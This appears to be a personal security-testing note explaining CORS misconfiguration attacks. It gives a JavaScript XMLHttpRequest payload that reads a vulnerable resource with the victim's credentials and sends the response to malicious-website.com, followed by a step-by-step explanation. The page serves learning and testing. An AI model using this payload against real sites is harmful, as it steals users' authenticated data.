# Basic CORS JavaScript

CORS has always been a super confusing one for me, dunno why, but this page will go in a little more depth than the others.

## Injection Payloads

### XMLHttpRequest

```javascript
<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','<$url/vulnerable_resource>',true);
	req.withCredentials = true;
	req.send();

	function reqListener() {
	   location='//malicious-website.com/log?key='+this.responseText;
	};
</script>
```

#### Explanation

**Steps**:

1. XMLHttpRequest: The XMLHttpRequest object is commonly used to make requests to a different domain (cross-origin requests) in web applications.

2. req.open(): In this line, the code is attempting to make a cross-origin request to a resource located at $url/vulnerable_resource. When making cross-origin requests using JavaScript, the browser enforces the Same-Origin Policy by default, which restricts scripts running on one origin from making requests to a different origin.

3. req.withCredentials: Setting the withCredentials property to true indicates that the request should include credentials (such as cookies or HTTP authentication) when making the cross-origin request. This triggers the browser to make a preflight request to the server to check if the cross-origin request is allowed.

4. req.send(): This method sends the cross-origin request to the server.

5. reqListener(): The reqListener function is called when the cross-origin request completes successfully. Inside this function, the code attempts to redirect the user to a different domain (malicious-website.com) and pass the response text of the original cross-origin request as a query parameter in the URL.

**Why this is a CORS Issue**:
* Cross-Origin Request: The script is making a request to a different origin (<$url/vulnerable_resource>) than the one that served the script. This is a cross-origin request, which is subject to CORS policies.

* Credentials: By setting withCredentials to true, the script is attempting to include user credentials (e.g., cookies) in the request. This requires the server to explicitly allow such requests through CORS headers.

* Data Exfiltration: The response from the cross-origin request is being sent to a malicious website. If the server does not properly handle CORS, it could inadvertently expose sensitive data to unauthorized origins.